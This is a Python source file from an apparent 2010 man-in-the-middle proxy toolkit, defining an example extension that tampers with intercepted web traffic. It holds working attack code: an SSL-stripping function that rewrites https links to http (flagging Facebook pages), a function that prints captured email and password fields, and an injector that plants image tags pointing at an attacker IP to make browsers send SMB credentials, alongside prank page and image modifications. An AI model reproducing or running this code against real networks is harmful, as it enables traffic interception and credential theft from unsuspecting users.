#!/usr/bin/env python
from sergio_proxy.MITM import MITM 

__author__ = "Ben Schmidt"
__copyright__ = "Copyright 2010, Ben Schmidt"
__credits__ = ["Ben Schmidt"]
__license__ = "GPL v3"
__version__ = "0.1"
__maintainer__ = "Ben Schmidt"
__email__ = "supernothing@spareclockcycles.org"
__status__ = "alpha"

from ImageFile import Parser
from cStringIO import StringIO
import re

class UserMITM(MITM):
    '''
    An example extension class utilizing the MITM class.
    '''
    # TODO: implement target_ip
    def __init__(self):
        reply_funcs=[self.omg_pwnies, self.invert_images]
        reply_funcs=[self.unssl]
        req_funcs=[] #, self.print_request]
        MITM.__init__(self,req_funcs,reply_funcs)

    def unssl(self):
        if 'html' in self.reply.response_headers.get('Content-Type', '').lower():
            if re.search('https://[A-Za-z0-9.-]*facebook.com', self.reply.data):
              print 'Facebook made insecure!'
            self.reply.data = self.reply.data.replace( \
              'https://', 'http://'
            )

    def passwd(self):
        if 'email' in self.req.args and 'pass' in self.req.args:
          print 'Email: {0.email}, Password: {0.pass}'.format(self.req.args)

    def omg_pwnies(self):
        if 'html' in self.reply.response_headers.get('Content-Type', '').lower():
          self.insert_html(pre=[("<title>","OMG PWNIES: ")])
          print "OmgPwnies"

    def invert_images(self):
        if self.reply.response_headers.get('Content-Type', None) \
          in  ["image/jpeg", "image/gif", "image/png"]:
            image_parser = Parser()
            image_parser.feed(self.reply.data)
            image = image_parser.close()
            try:
                format = image.format
                image = image.rotate(180)
                s = StringIO()
                image.save(s, format)
                self.reply.data = s.getvalue()
                s.close()
                print 'Image!'
            except Exception as e:
                print e

    
    def evoke_smb_auth(self):
        self.insert_html(post=
        [
            ("</body>",'<img src=\"\\\\%s\\image.jpg\">'%(self.target_ip)),#IE
            ("</body>",'<img src=\"file://///%s\\image.jpg\">'%(self.target_ip)),#FF < 2.0.0.4
            ("</body>",'<img src=\"moz-icon:file:///%5c/'+self.target_ip+'\\image.jpg\">'),#FF > 2.0.0.4
        ])
